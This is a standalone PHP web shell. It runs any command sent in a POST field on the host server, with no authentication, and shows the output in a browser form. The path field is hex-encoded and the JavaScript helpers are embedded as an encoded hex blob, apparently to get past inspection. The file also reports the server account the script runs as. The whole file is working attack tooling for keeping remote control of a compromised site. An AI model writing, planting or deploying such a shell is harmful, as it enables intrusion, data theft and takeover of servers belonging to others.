<?php

$hex = "6966282177696e646f772e756e657363617065297b77696e646f772e756e657363617065203d2066756e6374696f6e2873297b72657475726e20732e7265706c616365282f25285b302d39412d465d7b327d292f672c2066756e6374696f6e286d2c207029207b72657475726e20537472696e672e66726f6d43686172436f64652827307827202b2070293b7d293b7d3b7d6966282177696e646f772e657363617065297b77696e646f772e657363617065203d2066756e6374696f6e2873297b766172206368722c206865782c2069203d20302c206c203d20732e6c656e6774682c206f7574203d2027273b666f72283b2069203c206c3b2069202b2b297b636872203d20732e6368617241742869293b6966286368722e736561726368282f5b412d5a612d7a302d395c405c2a5c5f5c2b5c2d5c2e5c2f5d2f20293e202d31297b6f7574202b3d206368723b20636f6e74696e75653b207d686578203d20732e63686172436f646541742869292e746f537472696e672820313620293b6f7574202b3d20272527202b20286865782e6c656e6774682025203220213d2030203f20273027203a20272729202b206865783b7d72657475726e206f75743b7d3b7d66756e6374696f6e2062696e326865782873297b73203d20756e65736361706528656e636f6465555249436f6d706f6e656e74287329293b766172206368722c2069203d20302c206c203d20732e6c656e6774682c206f7574203d2027273b666f7228203b2069203c206c3b20692b2b20297b636872203d20732e63686172436f6465417428206920292e746f537472696e672820313620293b6f7574202b3d2028206368722e6c656e67746820252032203d3d20302029203f20636872203a20273027202b206368723b7d72657475726e206f75743b7d3b66756e6374696f6e206865783262696e2873297b72657475726e206465636f6465555249436f6d706f6e656e7428732e7265706c61636528202f2e2e2f672c2027252426272029293b7d3b";

function isWindows(){
    return (strtolower(substr(php_uname(),0,3)) == "win")? true : false;
}

if(!isset($_POST['path'])){
    $currentPath = getcwd();
    chdir($currentPath);
} else {
    $_POST['path'] = hex2bin($_POST['path']);
    $currentPath = $_POST['path'];
    chdir($currentPath);
} if(!isset($_POST['command'])){
    if (!isWindows()) {
        $currentCommand = "ls -lah";
    } else {
        $currentCommand = "dir";
    }
} else {
    $currentCommand = $_POST['command'];
}

function execute($currentPath, $currentCommand, $typeCommand)
{
    if (!isWindows()) {
        $multiCommand = ";";
    } else {
        $multiCommand = "|";
    }

    switch ($typeCommand) {
        case 'listDirOnly':
            $command = "cd {$currentPath}{$multiCommand}{$currentCommand}";
            if (!preg_match("/dir/i", $command)) {
                echo "please select full command";
            }
            break;
        case 'fullCommand':
            $command = $currentCommand;
            break;
    }

    $handle = popen($command,"r");
    while(!feof($handle)){
        $output = fgets($handle,4096);
        @$string .= $output;
    }
    pclose($handle);
    echo "<textarea rows=30 cols=100>".htmlspecialchars($string)."</textarea><br>";
}

?>
<form method="post" id="form">
    <input type="radio" id="listDirOnly" name="type" value="listDirOnly">
    <label for="listDirOnly">List Files Only</label>
    <input type="radio" id="fullCommand" name="type" value="fullCommand">
    <label for="fullCommand">Full Command</label><br>
    <input class="command" name="command" style="width: 750px;" type="text" value="<?php echo $currentCommand;?>"><br>
    <input class="path" name="path" style="width: 750px;" type="text" value="<?php echo $currentPath;?>"><br>
    <input type="hidden" name="exe" value="exe">
    <span class="submit">Execute</span>
</form>

<script type="text/javascript">
    <?php echo hex2bin($hex) ?>

    form = document.querySelector("#form");
    path = document.querySelector(".path");
    command = document.querySelector(".command");
    btnSubmit = document.querySelector(".submit");
    listDirOnly = document.querySelector("#listDirOnly");
    fullCommand = document.querySelector("#fullCommand");
    console.log(btnSubmit)
    btnSubmit.addEventListener("click", function(event) {
        event.preventDefault();
        path.value = bin2hex(path.value);
        form.submit();

    });

    listDirOnly.addEventListener("click", function(event) {
        localStorage.setItem("listDirOnly-checked", true);
        localStorage.removeItem("fullCommand-checked");
    });

    fullCommand.addEventListener("click", function(event) {
        localStorage.setItem("fullCommand-checked", true);
        localStorage.removeItem("listDirOnly-checked");
    });

    listDirOnly.checked = localStorage.getItem("listDirOnly-checked");
    fullCommand.checked = localStorage.getItem("fullCommand-checked");
</script>

<?php 
if(isset($_POST['exe'])){
    echo 'Current script owner: ' . get_current_user()."<br>";
    switch ($_POST['type']) {
        case 'listDirOnly':
            execute($currentPath, $currentCommand, "listDirOnly");
            break;
        case 'fullCommand':
            execute($currentPath, $currentCommand, "fullCommand");
            break;
        default:
            echo "please select type !";
            break;
    }
}

print_r($_POST);
